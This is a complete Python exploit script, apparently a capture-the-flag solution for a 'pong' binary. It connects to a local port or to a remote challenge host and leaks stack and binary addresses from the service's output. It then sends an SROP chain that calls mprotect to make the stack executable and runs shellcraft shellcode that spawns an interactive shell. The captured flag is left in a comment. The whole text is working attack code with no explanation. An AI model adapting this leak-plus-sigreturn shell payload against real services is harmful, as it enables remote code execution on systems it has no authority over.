#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './pong'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':1440}, \
                        remote  = {'host':'flu.xxx', 'port':10060})
env.set_item('stack_offset',    local = 0, remote = -0x10)
env.select()

#==========

binf = ELF(bin_file)
ofs_start           = binf.symbols['_start']
ofs_inc_eax         = 0x00103c  # inc eax; cmp r8, 4; jl 0x1010; ret;
ofs_syscall         = 0x001036  # syscall

#==========

def attack(conn, **kwargs):
    conn.send(b'a')
    leak = conn.recv(0x200)
    # addr_stack = u64(leak[0x178:0x178+8]) - 0x3c9
    addr_stack = u64(leak[0x178+env.stack_offset:0x178+env.stack_offset+8]) - (0x3c9+env.stack_offset)
    info('addr_stack        = 0x{:012x}'.format(addr_stack))

    '''
    addr_vdso = u64(leak[0x78:0x78+8])
    info('addr_vdso         = 0x{:012x}'.format(addr_vdso))
    '''

    # addr_start = u64(leak[0x118:0x118+8])
    addr_start = u64(leak[0x118+env.stack_offset:0x118+env.stack_offset+8])
    binf.address = addr_start - ofs_start
    info('addr_binf_base    = 0x{:08x}'.format(binf.address))

    conn.send(b'b')
    conn.recv(0x200)
    conn.send(b'c')
    conn.recv(0x200)

    frame = SigreturnFrame()
    frame.rax = constants.SYS_mprotect
    frame.rdi = addr_stack & ~(0x1000-1)
    frame.rsi = 0x1000
    frame.rdx = 0x7
    frame.rsp = addr_stack + 0x178
    frame.rip = binf.address + ofs_syscall
    frame.r8  = 4

    shellasm = shellcraft.sh()

    exploit  = p64(binf.address + ofs_inc_eax)*0xf
    exploit += p64(binf.address + ofs_syscall)
    exploit += bytes(frame)
    exploit += p64(addr_stack + 0x180)
    exploit += asm(shellasm)
    conn.send(exploit)
    conn.recv(0x200)

class Pwn:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def func(self):
        self.sendlineafter(b'> ', b'1')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{g0tt4_l0v3_5r0pp1ng!}

if __name__=='__main__':
    main()

#==========
